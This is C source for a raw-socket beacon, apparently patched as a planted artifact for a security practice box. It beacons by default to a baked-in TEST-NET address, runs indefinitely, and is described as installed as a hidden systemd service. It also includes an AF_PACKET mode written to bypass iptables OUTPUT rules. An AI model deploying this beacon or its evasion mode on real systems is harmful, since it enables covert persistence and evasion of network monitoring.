/*
 * huitzilopochtli box artifact -- patched copy of the rawsockets-beacon
 * defensive-security test tool (source supplied by the workshop author;
 * "iptablesavoider-deepseek" variant). Upstream purpose and packet layout
 * are documented in the comments below and are unchanged.
 *
 * Box patches (everything else is byte-identical to upstream):
 *   - DEFAULT_TARGET added: bare invocation (no -t) beacons 203.0.113.66,
 *     so the planted cmdline leaks no indicator of compromise.
 *   - DEFAULT_PORT 4444 -> 8443, DEFAULT_INTERVAL 2 -> 30,
 *     DEFAULT_COUNT 10 -> 0 (run until stopped).
 *   - Default beacon id "fw-test" -> "lk-7731".
 * The compiled binary ships base64-encoded inside
 * boxbuilder/vulndb_vuln_configs/raw-socket-beacon.json, which plants it as
 * a systemd service on practice boxes. The C2 destination is an RFC 5737
 * TEST-NET-3 address: packets leave the default gateway and die upstream.
 */
/*
 * beacon.c — Raw-socket beacon for Linux
 * =========================================
 *
 * PURPOSE
 * ------
 * This is a *defensive security test tool*. It generates traffic with a raw
 * socket so that a kernel-level firewall module can be validated: does it
 * (a) detect that a raw socket was created, and (b) block packets emitted
 * through that raw socket? You run this on YOUR OWN hosts/network segment to
 * verify your firewall's raw-socket telemetry and enforcement.
 *
 * WHAT A "BEACON" IS
 * ------------------
 * A beacon is a small program that periodically sends a recognizable packet
 * toward a configured destination ("call home"). Here the beacon:
 *   1. Opens a raw socket (SOCK_RAW).
 *   2. Builds the IPv4 header and TCP header BY HAND (no kernel help).
 *   3. Injects a unique beacon ID + timestamp into the payload.
 *   4. Sends the packet every `-i` seconds, so a packet capture / firewall
 *      log shows a periodic, identifiable signal.
 *
 * WHY RAW SOCKETS
 * ---------------
 * A normal socket() lets the kernel fill in the IP/TCP headers. A RAW socket
 * hands us the raw bytes on the wire, so WE construct every header field.
 * That is exactly the behavior a firewall wants to detect and gate, because
 * raw sockets let us forge source addresses, craft arbitrary flags, and hide
 * payloads — classic evasion primitives. By emitting a *clean, labeled*
 * beacon we make detection trivially observable during your testing.
 *
 * PRIVILEGE REQUIREMENT
 * ---------------------
 * Creating SOCK_RAW sockets requires CAP_NET_RAW (i.e. root, or a binary with
 * the raw capability). The program checks for this up front and explains if
 * the socket creation failed, so you can run it under `sudo` or set:
 *     sudo setcap cap_net_raw+ep ./beacon
 *
 * BUILD / RUN
 * -----------
 *     make
 *     sudo ./beacon -t 192.168.1.10 -p 4444 -i 2 -n 5 -id "fw-test-01"
 *
 * BUILDING THE PACKET — FIELD BY FIELD
 * ------------------------------------
 * The packet is laid out in network byte order (big-endian, as bytes go on
 * the wire). We use the standard <netinet/ip.h> and <netinet/tcp.h> structs
 * and fill every field explicitly so the code doubles as documentation.
 */

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <time.h>
#include <unistd.h>
#include <stdint.h>
#include <poll.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/route.h>

/* ---------------------------------------------------------------------------
 * Configuration defaults — override with command-line flags.
 * ------------------------------------------------------------------------- */
#define DEFAULT_INTERVAL 30      /* seconds between beacons                    */
#define DEFAULT_COUNT    0     /* total beacons to send (0 = run forever)    */
#define DEFAULT_PORT     8443   /* destination TCP port                       */
#define DEFAULT_TTL      64
#define DEFAULT_TARGET   "203.0.113.66"     /* baked C2: TEST-NET-3, no -t needed         */

/* ---------------------------------------------------------------------------
 * checksum() — Internet checksum (RFC 1071)
 *
 * The TCP/IP checksum is a 16-bit one's-complement sum of the data, computed
 * over 16-bit words. The kernel computes it for normal sockets; with raw
 * sockets WE must. Algorithm:
 *   1. Sum all 16-bit words (carry bits wrap around into bit 0).
 *   2. Fold any final carry into the low bits.
 *   3. One's complement (invert all bits).
 * The caller supplies the buffer length; the function handles odd lengths by
 * padding with a zero byte, which does not affect the result.
 * ------------------------------------------------------------------------- */
static unsigned short checksum(const void *data, size_t len)
{
    const unsigned char *buf = data;
    unsigned long sum = 0;

    /* Sum consecutive 16-bit words, treating the buffer as big-endian. */
    for (size_t i = 0; i + 1 < len; i += 2)
        sum += (buf[i] << 8) | buf[i + 1];

    /* Odd trailing byte: pad with a zero high byte. */
    if (len & 1)
        sum += buf[len - 1] << 8;

    /* Fold carries: each carry bit is added back into the low 16 bits. */
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    /* One's complement inverts all bits. */
    return (unsigned short)(~sum & 0xFFFF);
}

/* ---------------------------------------------------------------------------
 * build_ip_header() — Construct the 20-byte IPv4 header in network order.
 *
 * Every field is documented below. We do NOT rely on IP_HDRINCL behavior for
 * the version/header-length byte; we set it explicitly. `total_len` is the
 * length of the ENTIRE packet (IP header + TCP header + payload).
 * ------------------------------------------------------------------------- */
static void build_ip_header(struct iphdr *ip,
                            const char *src, const char *dst,
                            unsigned int total_len, unsigned char ttl)
{
    ip->version = 4;                 /* IPv4                                 */
    ip->ihl = 5;                     /* 5 words = 20 bytes, no options       */
    ip->tos = 0;                     /* Type-of-Service: default             */
    ip->tot_len = htons(total_len);  /* total packet length (network order)  */
    ip->id = htons(0xBEAC);          /* identification field (arbitrary)     */
    ip->frag_off = 0;                /* no fragmentation (DF=0, offset=0)    */
    ip->ttl = ttl;                   /* time to live                         */
    ip->protocol = IPPROTO_TCP;      /* next header is TCP (6)               */
    ip->check = 0;                   /* zeroed before computing checksum     */
    /* Source and destination addresses converted from dotted-quad strings.  */
    ip->saddr = inet_addr(src);
    ip->daddr = inet_addr(dst);
    /* The checksum covers ONLY the 20-byte IP header.                       */
    /* checksum() returns a host-order value; htons() lays it out in network */
    /* byte order so the bytes on the wire are correct on any endianness.    */
    ip->check = htons(checksum(ip, sizeof(*ip)));
}

/* ---------------------------------------------------------------------------
 * build_tcp_header() — Fill the 20-byte TCP header struct in network order.
 *
 * This function only *sets* the fields. The TCP checksum is deliberately NOT
 * computed here, because it needs the source/destination IP addresses (for
 * the pseudo-header), which live in the IP header already built — so the
 * checksum is finalized in build_packet(), which owns the whole packet.
 *
 * We send a SYN packet (the "open a connection" handshake) with a custom
 * payload appended — a recognizable beacon pattern. The exact flags don't
 * matter for the firewall test; what matters is that we forged the entire
 * header ourselves rather than letting the kernel fill it in.
 * ------------------------------------------------------------------------- */
static void build_tcp_header(struct tcphdr *tcp,
                             unsigned short src_port, unsigned short dst_port,
                             unsigned int seq, unsigned int ack)
{
    tcp->source = htons(src_port);          /* forged source port           */
    tcp->dest = htons(dst_port);            /* destination port             */
    tcp->seq = htonl(seq);                  /* sequence number              */
    tcp->ack_seq = htonl(ack);              /* acknowledgement number       */
    tcp->doff = 5;                          /* 5 words = 20 bytes, no opts  */
    tcp->fin = 0;                           /* FIN flag                     */
    tcp->syn = 1;                           /* SYN flag: "new connection"   */
    tcp->rst = 0;                           /* RST flag                     */
    tcp->psh = 0;                           /* PUSH flag                    */
    tcp->ack = 0;                           /* ACK flag                     */
    tcp->urg = 0;                           /* URG flag                     */
    tcp->window = htons(65535);             /* advertised receive window    */
    tcp->check = 0;                         /* zeroed before checksum       */
    tcp->urg_ptr = 0;                       /* urgent pointer               */
}

/* ---------------------------------------------------------------------------
 * build_packet() — Assemble the full IP+TCP packet with a beacon payload.
 *
 * Layout on the wire:
 *   [ IPv4 header (20) ][ TCP header (20) ][ beacon payload ]
 *
 * Returns the total length of the buffer, or 0 on error.
 * ------------------------------------------------------------------------- */
static unsigned int build_packet(unsigned char *packet, size_t packet_cap,
                                 const char *src, const char *dst,
                                 unsigned short src_port, unsigned short dst_port,
                                 unsigned int seq, unsigned int ack,
                                 const char *beacon_id)
{
    size_t id_len = strlen(beacon_id);

    /*
     * ---- Beacon payload layout (fixed-width, parseable in a capture): ----
     *   bytes 0..3   magic marker "BEA1" (recognizable)
     *   bytes 4..7   reserved (zeros)
     *   then         beacon ID string, NUL-terminated
     *   then         ASCII decimal Unix timestamp, NUL-terminated
     *
     * Compute the EXACT payload length up front (including the timestamp)
     * so the total packet length is known BEFORE building the IP header —
     * the IP checksum depends on tot_len, so it must be final at build time.
     */
    char timestamp[16];
    snprintf(timestamp, sizeof(timestamp), "%lld", (long long)time(NULL));
    size_t payload_len = 8 + (id_len + 1) + (strlen(timestamp) + 1);

    /* Guard against a caller that passed too-small a buffer. */
    if (packet_cap < sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len) {
        fprintf(stderr, "packet buffer too small\n");
        return 0;
    }

    /* Zero the buffer first so no uninitialized bytes leak to the wire. */
    memset(packet, 0, packet_cap);

    struct iphdr  *ip  = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    unsigned char *payload = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

    unsigned int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;

    /* ---- Build the IPv4 header (checksum valid: tot_len is final). ---- */
    build_ip_header(ip, src, dst, total_len, DEFAULT_TTL);

    /* ---- Build the TCP header. ---- */
    build_tcp_header(tcp, src_port, dst_port, seq, ack);

    /* ---- Fill the beacon payload. ---- */
    memcpy(payload, "BEA1", 4);                     /* magic marker         */
    memset(payload + 4, 0, 4);                      /* reserved              */
    char *p = (char *)payload + 8;
    /* Copy the beacon ID; leave room for its terminator. */
    snprintf(p, id_len + 1, "%s", beacon_id);
    p += id_len + 1;
    /* Append the timestamp as ASCII decimal. */
    memcpy(p, timestamp, strlen(timestamp) + 1);

    /*
     * ---- TCP checksum with pseudo-header. ----
     * Pseudo-header layout (RFC 793):
     *   bytes 0..3   source IP
     *   bytes 4..7   destination IP
     *   byte  8      reserved (0)
     *   byte  9      protocol (TCP = 6)
     *   bytes 10..11 TCP segment length (header + payload)
     */
    unsigned char pseudo[12 + sizeof(struct tcphdr) + payload_len];
    memset(pseudo, 0, sizeof(pseudo));
    memcpy(pseudo, &ip->saddr, 4);                    /* src IP              */
    memcpy(pseudo + 4, &ip->daddr, 4);                /* dst IP              */
    pseudo[9] = IPPROTO_TCP;                          /* protocol            */
    unsigned short seg_len = htons(sizeof(struct tcphdr) + payload_len);
    memcpy(pseudo + 10, &seg_len, 2);                 /* TCP segment length  */
    memcpy(pseudo + 12, tcp, sizeof(struct tcphdr));  /* TCP header          */
    memcpy(pseudo + 12 + sizeof(struct tcphdr), payload, payload_len);

    /* The checksum covers the pseudo-header + TCP header + payload. */
    /* Same endianness note as the IP checksum: store in network order. */
    tcp->check = htons(checksum(pseudo, sizeof(pseudo)));

    return total_len;
}

/* ---------------------------------------------------------------------------
 * print_packet_summary() — Human-readable log line for the operator so they
 * can correlate the beacon with the firewall's detection/block logs.
 * ------------------------------------------------------------------------- */
static void print_packet_summary(const char *src, const char *dst,
                                 unsigned short sport, unsigned short dport,
                                 unsigned int seq)
{
    printf("[beacon] %s:%u -> %s:%u  SYN  seq=%u\n",
           src, sport, dst, dport, seq);
    fflush(stdout);
}

/* ---------------------------------------------------------------------------
 * usage() — Command-line help.
 * ------------------------------------------------------------------------- */
static void usage(const char *prog)
{
    fprintf(stderr,
        "Usage: %s -t <target_ip> [options]\n"
        "  -t <ip>     Destination IP address (required)\n"
        "  -p <port>   Destination TCP port (default %d)\n"
        "  -s <ip>     Forged source IP (default 0.0.0.0 = kernel fills real one)\n"
        "  -i <secs>   Beacon interval in seconds (default %d)\n"
        "  -n <count>  Number of beacons (0 = run forever, default %d)\n"
        "  -b <str>    Beacon identifier string (default \"lk-7731\")\n"
        "  -m <iface>  L2 bypass mode: inject full Ethernet frames via\n"
        "              AF_PACKET on <iface>, bypassing netfilter's LOCAL_OUT\n"
        "              hook so iptables OUTPUT rules cannot see the packets\n"
        "  -M <mac>    Next-hop MAC (aa:bb:cc:dd:ee:ff); skips ARP resolution\n"
        "              (only meaningful with -m)\n"
        "  -v          Verbose packet dump\n"
        "\n"
        "Requires root or CAP_NET_RAW (sudo setcap cap_net_raw+ep %s)\n",
        prog, DEFAULT_PORT, DEFAULT_INTERVAL, DEFAULT_COUNT, prog);
}

/* ---------------------------------------------------------------------------
 * L2 BYPASS MODE (-m <iface>)
 * ---------------------------------------------------------------------------
 * The AF_INET/IPPROTO_RAW path above routes the packet through the kernel IP
 * stack, which invokes netfilter's NF_INET_LOCAL_OUT hook — the exact hook
 * iptables' OUTPUT chain attaches to. That is why iptables can block it.
 *
 * AF_PACKET SOCK_RAW lets us inject a complete Ethernet frame straight to the
 * device via dev_queue_xmit(), which NEVER passes through the IP stack or the
 * LOCAL_OUT netfilter hook. iptables OUTPUT rules therefore do not see these
 * packets. This is the classic raw-socket evasion primitive; a kernel
 * firewall that only hooks LOCAL_OUT will miss it and must hook at the
 * driver / XDP / TC layer instead. That is precisely what you want to test.
 *
 * To inject at L2 we must build the whole frame ourselves, including the
 * destination MAC. We resolve the next hop from the routing table and learn
 * its MAC with an ARP request (or take a MAC explicitly with -M).
 *
 * NOTE on /proc/net/route: each address is printed as the hex of the native
 * uint32 whose in-memory bytes are the network-order address. That is the
 * same representation inet_addr() produces, so we compare/return the raw
 * values directly — no byte-swap, or we'd reverse them.
 * ------------------------------------------------------------------------- */

/* ---------------------------------------------------------------------------
 * get_iface_info() — Resolve an interface's MAC address and IPv4 address.
 * ------------------------------------------------------------------------- */
static int get_iface_info(const char *iface, unsigned char *mac, uint32_t *ip)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0)
        return -1;

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", iface);

    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) { close(s); return -1; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) { close(s); return -1; }
    *ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;

    close(s);
    return 0;
}

/* ---------------------------------------------------------------------------
 * find_next_hop() — Longest-prefix route lookup via /proc/net/route.
 *
 * Returns the next-hop IP (network order) that the kernel would use to reach
 * `target`, and the name of the egress interface. If the best route is a
 * gateway, the next hop is the gateway; otherwise the target is on-link.
 * ------------------------------------------------------------------------- */
static int find_next_hop(uint32_t target, uint32_t *next_hop,
                         char *route_iface, size_t iface_cap)
{
    FILE *f = fopen("/proc/net/route", "r");
    if (!f)
        return -1;

    char line[256];
    uint32_t best_mask = 0, best_gw = 0;
    int best_flags = 0, found = 0;
    char best_iface[IFNAMSIZ] = { 0 };

    if (fgets(line, sizeof(line), f) == NULL) { fclose(f); return -1; } /* hdr */

    while (fgets(line, sizeof(line), f)) {
        char iface[IFNAMSIZ];
        unsigned dest, gw, flags, mask;
        if (sscanf(line, "%s %x %x %x %*d %*d %*d %x",
                   iface, &dest, &gw, &flags, &mask) != 5)
            continue;
        uint32_t nmask = (uint32_t)mask;
        uint32_t ndest = (uint32_t)dest;
        /* Longest-prefix match (ties keep the first). */
        if ((target & nmask) == (ndest & nmask) && nmask >= best_mask) {
            best_mask = nmask;
            best_gw = (uint32_t)gw;
            best_flags = (int)flags;
            found = 1;
            snprintf(best_iface, sizeof(best_iface), "%s", iface);
        }
    }
    fclose(f);

    if (!found)
        return -1;
    *next_hop = (best_flags & RTF_GATEWAY) ? best_gw : target;
    snprintf(route_iface, iface_cap, "%s", best_iface);
    return 0;
}

/* ---------------------------------------------------------------------------
 * arp_resolve() — Send a who-has ARP request for `next_hop` on the AF_PACKET
 * socket and wait for the reply, returning the neighbor's MAC in `out_mac`.
 * ------------------------------------------------------------------------- */
static int arp_resolve(int sock, int ifindex,
                       const unsigned char *local_mac, uint32_t local_ip,
                       uint32_t next_hop, unsigned char *out_mac,
                       int timeout_sec)
{
    unsigned char frame[sizeof(struct ethhdr) + sizeof(struct ether_arp)];
    memset(frame, 0, sizeof(frame));

    struct ethhdr *eth = (struct ethhdr *)frame;
    struct ether_arp *arp = (struct ether_arp *)(frame + sizeof(struct ethhdr));

    /* Ethernet: broadcast destination, our source MAC, ARP ethertype. */
    memset(eth->h_dest, 0xFF, 6);
    memcpy(eth->h_source, local_mac, 6);
    eth->h_proto = htons(ETH_P_ARP);

    /* ARP who-has next_hop, tell local_ip. */
    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETH_P_IP);
    arp->arp_hln = 6;
    arp->arp_pln = 4;
    arp->arp_op = htons(ARPOP_REQUEST);
    memcpy(arp->arp_sha, local_mac, 6);
    memset(arp->arp_tha, 0xFF, 6);
    memcpy(arp->arp_spa, &local_ip, 4);
    memcpy(arp->arp_tpa, &next_hop, 4);

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_ifindex = ifindex;
    addr.sll_halen = 6;
    memset(addr.sll_addr, 0xFF, 6);

    if (sendto(sock, frame, sizeof(frame), 0,
               (struct sockaddr *)&addr, sizeof(addr)) < 0)
        return -1;

    /* Wait for the ARP reply; ignore anything that is not our target. */
    unsigned char rbuf[2048];
    for (;;) {
        struct pollfd pfd = { .fd = sock, .events = POLLIN };
        if (poll(&pfd, 1, timeout_sec * 1000) <= 0)
            return -1; /* timeout: neighbor did not answer */

        struct sockaddr_ll raddr;
        socklen_t alen = sizeof(raddr);
        ssize_t n = recvfrom(sock, rbuf, sizeof(rbuf), 0,
                             (struct sockaddr *)&raddr, &alen);
        if (n < (ssize_t)(sizeof(struct ethhdr) + sizeof(struct ether_arp)))
            continue;

        struct ethhdr *reth = (struct ethhdr *)rbuf;
        if (ntohs(reth->h_proto) != ETH_P_ARP)
            continue;
        struct ether_arp *rarp = (struct ether_arp *)(rbuf + sizeof(struct ethhdr));
        if (ntohs(rarp->arp_op) != ARPOP_REPLY)
            continue;
        uint32_t sip;
        memcpy(&sip, rarp->arp_spa, 4);
        if (sip != next_hop)
            continue;
        memcpy(out_mac, rarp->arp_sha, 6);
        return 0;
    }
}

/* ---------------------------------------------------------------------------
 * build_ethernet_frame() — Prepend the 14-byte Ethernet header to a finished
 * IP packet so it can be injected at L2. Returns the full frame length.
 * ------------------------------------------------------------------------- */
static unsigned int build_ethernet_frame(unsigned char *frame, size_t frame_cap,
                                         const unsigned char *dst_mac,
                                         const unsigned char *src_mac,
                                         const unsigned char *ip_pkt,
                                         unsigned int ip_len)
{
    if (frame_cap < sizeof(struct ethhdr) + ip_len)
        return 0;

    struct ethhdr *eth = (struct ethhdr *)frame;
    memcpy(eth->h_dest, dst_mac, 6);
    memcpy(eth->h_source, src_mac, 6);
    eth->h_proto = htons(ETH_P_IP);
    memcpy(frame + sizeof(struct ethhdr), ip_pkt, ip_len);
    return sizeof(struct ethhdr) + ip_len;
}

/* ---------------------------------------------------------------------------
 * parse_mac() — Parse "aa:bb:cc:dd:ee:ff" into 6 raw bytes (for -M).
 * ------------------------------------------------------------------------- */
static int parse_mac(const char *s, unsigned char *mac)
{
    unsigned int b[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++)
        mac[i] = (unsigned char)b[i];
    return 0;
}

/* ---------------------------------------------------------------------------
 * main() — Parse arguments, open the raw socket, and run the beacon loop.
 * ------------------------------------------------------------------------- */
int main(int argc, char **argv)
{
    const char *target = DEFAULT_TARGET;
    const char *src    = "0.0.0.0";   /* will be replaced with local address */
    unsigned short dport = DEFAULT_PORT;
    unsigned short sport = 0;         /* random per beacon below              */
    int interval = DEFAULT_INTERVAL;
    int count    = DEFAULT_COUNT;
    const char *beacon_id = "lk-7731";
    int verbose = 0;
    const char *l2_iface = NULL;     /* -m: AF_PACKET L2-bypass mode         */
    const char *dst_mac_str = NULL;  /* -M: explicit next-hop MAC            */
    char src_buf[INET_ADDRSTRLEN];   /* interface IP substituted for -s 0.0.0.0 */

    /* ---- Parse command-line options. ---- */
    int opt;
    while ((opt = getopt(argc, argv, "t:p:s:i:n:b:m:M:vh")) != -1) {
        switch (opt) {
        case 't': target = optarg; break;
        case 'p': dport = (unsigned short)atoi(optarg); break;
        case 's': src = optarg; break;
        case 'i': interval = atoi(optarg); break;
        case 'n': count = atoi(optarg); break;
        case 'b': beacon_id = optarg; break;
        case 'm': l2_iface = optarg; break;
        case 'M': dst_mac_str = optarg; break;
        case 'v': verbose = 1; break;
        case 'h': usage(argv[0]); return 0;
        default:  usage(argv[0]); return 1;
        }
    }

    if (!target) {
        usage(argv[0]);
        return 1;
    }
    if (interval < 1) {
        fprintf(stderr, "interval must be >= 1 second\n");
        return 1;
    }

    /*
     * ---- Open the raw socket. ----
     * socket(AF_INET, SOCK_RAW, IPPROTO_RAW):
     *   - AF_INET    : IPv4 addressing
     *   - SOCK_RAW   : raw socket; we build the headers ourselves
     *   - IPPROTO_RAW: tells the kernel NOT to fill in the IP header — we
     *                  supply the complete packet via sendto().
     * This single syscall is the primary signature your firewall should
     * detect and block. If it fails with EPERM, we lack privileges.
     */
    /*
     * ---- Resolve the target to a sockaddr for sendto(). ----
     * The AF_INET path uses it to route; the L2 path uses it to compute the
     * next hop. Reject bad addresses up front regardless of mode.
     */
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(dport);          /* not used for raw, but harmless */
    dest.sin_addr.s_addr = inet_addr(target);
    if (dest.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "invalid target address: %s\n", target);
        return 1;
    }

    int sock;
    int l2 = (l2_iface != NULL);
    unsigned char local_mac[6], dst_mac[6];
    int ifindex = -1;

    if (l2) {
        /*
         * ---- L2 bypass mode (AF_PACKET). ----
         * Craft the full Ethernet frame and inject straight to the device,
         * bypassing the IP stack and netfilter's LOCAL_OUT hook so iptables
         * OUTPUT rules cannot see the packets. See the helper block above.
         */
        uint32_t local_ip;
        if (get_iface_info(l2_iface, local_mac, &local_ip) < 0) {
            fprintf(stderr, "could not resolve interface %s\n", l2_iface);
            return 1;
        }
        /* Default the forged source to the real interface IP (no 0.0.0.0). */
        if (strcmp(src, "0.0.0.0") == 0) {
            snprintf(src_buf, sizeof(src_buf), "%s",
                     inet_ntoa(*(struct in_addr *)&local_ip));
            src = src_buf;
        }

        ifindex = (int)if_nametoindex(l2_iface);
        if (ifindex == 0) {
            fprintf(stderr, "no such interface: %s\n", l2_iface);
            return 1;
        }

        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (sock < 0) {
            fprintf(stderr, "socket(AF_PACKET, SOCK_RAW) failed: %s\n",
                    strerror(errno));
            fprintf(stderr,
                "  -> You need root or CAP_NET_RAW.\n"
                "     Try: sudo %s -t %s -m %s\n"
                "     Or:  sudo setcap cap_net_raw+ep %s\n",
                argv[0], target, l2_iface, argv[0]);
            return 1;
        }

        struct sockaddr_ll baddr;
        memset(&baddr, 0, sizeof(baddr));
        baddr.sll_family = AF_PACKET;
        baddr.sll_protocol = htons(ETH_P_ALL);
        baddr.sll_ifindex = ifindex;
        if (bind(sock, (struct sockaddr *)&baddr, sizeof(baddr)) < 0) {
            fprintf(stderr, "bind(AF_PACKET) failed: %s\n", strerror(errno));
            close(sock);
            return 1;
        }

        /* Resolve the next-hop MAC: explicit -M, else ARP. */
        if (dst_mac_str) {
            if (parse_mac(dst_mac_str, dst_mac) < 0) {
                fprintf(stderr, "invalid MAC: %s (use aa:bb:cc:dd:ee:ff)\n",
                        dst_mac_str);
                close(sock);
                return 1;
            }
        } else {
            uint32_t next_hop = dest.sin_addr.s_addr;
            char route_iface[IFNAMSIZ];
            if (find_next_hop(dest.sin_addr.s_addr, &next_hop,
                              route_iface, sizeof(route_iface)) < 0)
                next_hop = dest.sin_addr.s_addr; /* assume on-link */

            char nh[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &next_hop, nh, sizeof(nh));
            printf("[beacon] resolving next-hop %s via ARP on %s\n",
                   nh, l2_iface);
            if (arp_resolve(sock, ifindex, local_mac, local_ip, next_hop,
                            dst_mac, 3) < 0) {
                fprintf(stderr,
                    "ARP resolution failed for %s\n"
                    "  -> Is the next hop reachable? Or pass its MAC with -M\n",
                    nh);
                close(sock);
                return 1;
            }
            printf("[beacon] next-hop MAC %02x:%02x:%02x:%02x:%02x:%02x\n",
                   dst_mac[0], dst_mac[1], dst_mac[2],
                   dst_mac[3], dst_mac[4], dst_mac[5]);
        }

        printf("[beacon] AF_PACKET L2-bypass mode on %s (fd=%d)\n",
               l2_iface, sock);
    } else {
        /*
         * ---- Open the raw socket (original mode). ----
         * socket(AF_INET, SOCK_RAW, IPPROTO_RAW):
         *   - AF_INET    : IPv4 addressing
         *   - SOCK_RAW   : raw socket; we build the headers ourselves
         *   - IPPROTO_RAW: tells the kernel NOT to fill in the IP header — we
         *                  supply the complete packet via sendto().
         * This single syscall is the primary signature your firewall should
         * detect and block. If it fails with EPERM, we lack privileges.
         */
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            fprintf(stderr,
                    "socket(AF_INET, SOCK_RAW, IPPROTO_RAW) failed: %s\n",
                    strerror(errno));
            fprintf(stderr,
                "  -> You need root or CAP_NET_RAW.\n"
                "     Try: sudo %s -t %s\n"
                "     Or:  sudo setcap cap_net_raw+ep %s\n",
                argv[0], target, argv[0]);
            return 1;
        }
        printf("[beacon] raw socket opened (fd=%d)\n", sock);
    }

    printf("[beacon] target %s:%u  interval %ds  count %d  id \"%s\"\n",
           target, dport, interval, count, beacon_id);

    /* Packet buffer big enough for IP + TCP + a generous payload. */
    unsigned char packet[128];
    unsigned char frame[sizeof(struct ethhdr) + sizeof(packet)];
    unsigned int seq = 1;                  /* monotonically increasing seq    */

    for (int i = 0; count == 0 || i < count; i++) {
        /*
         * ---- Assemble the packet for this beacon. ----
         * Each beacon gets a fresh random source port and incremented seq so
         * the traffic looks like a new connection attempt every interval —
         * realistic for a beacon, and easy to correlate in your logs.
         */
        sport = (unsigned short)(10000 + (rand() % 50000));
        unsigned int total = build_packet(packet, sizeof(packet),
                                          src, target, sport, dport,
                                          seq, 0, beacon_id);
        if (total == 0) {
            fprintf(stderr, "packet construction failed\n");
            close(sock);
            return 1;
        }
        seq += 1;

        /*
         * ---- Send the raw packet. ----
         * AF_INET mode: sendto() copies our buffer straight to the wire;
         * because the socket is IPPROTO_RAW, the kernel does not touch our
         * headers — but the packet still traverses netfilter LOCAL_OUT.
         *
         * L2 mode: wrap the IP packet in an Ethernet frame and inject it via
         * the AF_PACKET socket addressed to the resolved next-hop MAC. This
         * bypasses the IP stack and the LOCAL_OUT netfilter hook entirely.
         */
        ssize_t sent;
        if (l2) {
            unsigned int ftotal = build_ethernet_frame(frame, sizeof(frame),
                                                       dst_mac, local_mac,
                                                       packet, total);
            if (ftotal == 0) {
                fprintf(stderr, "frame construction failed\n");
                close(sock);
                return 1;
            }
            struct sockaddr_ll addr;
            memset(&addr, 0, sizeof(addr));
            addr.sll_family = AF_PACKET;
            addr.sll_protocol = htons(ETH_P_IP);
            addr.sll_ifindex = ifindex;
            addr.sll_halen = 6;
            memcpy(addr.sll_addr, dst_mac, 6);
            sent = sendto(sock, frame, ftotal, 0,
                          (struct sockaddr *)&addr, sizeof(addr));
            total = ftotal;
        } else {
            sent = sendto(sock, packet, total, 0,
                          (struct sockaddr *)&dest, sizeof(dest));
        }
        if (sent < 0) {
            fprintf(stderr, "sendto failed: %s\n", strerror(errno));
            /* Don't abort the whole run — a single dropped packet may be    */
            /* exactly what your firewall is doing (blocking!). Report and   */
            /* continue so you can observe the pattern.                      */
        } else {
            print_packet_summary(src, target, sport, dport, seq - 1);
            if (verbose) {
                /* Hex dump of what actually went on the wire. */
                printf("  wire bytes (%u): ", total);
                for (unsigned int b = 0; b < total; b++)
                    printf("%02x", packet[b]);
                printf("\n");
            }
        }

        /* ---- Wait for the next interval, unless this is the last beacon. */
        if (count != 0 && i == count - 1)
            break;
        sleep(interval);
    }

    close(sock);
    printf("[beacon] done\n");
    return 0;
}
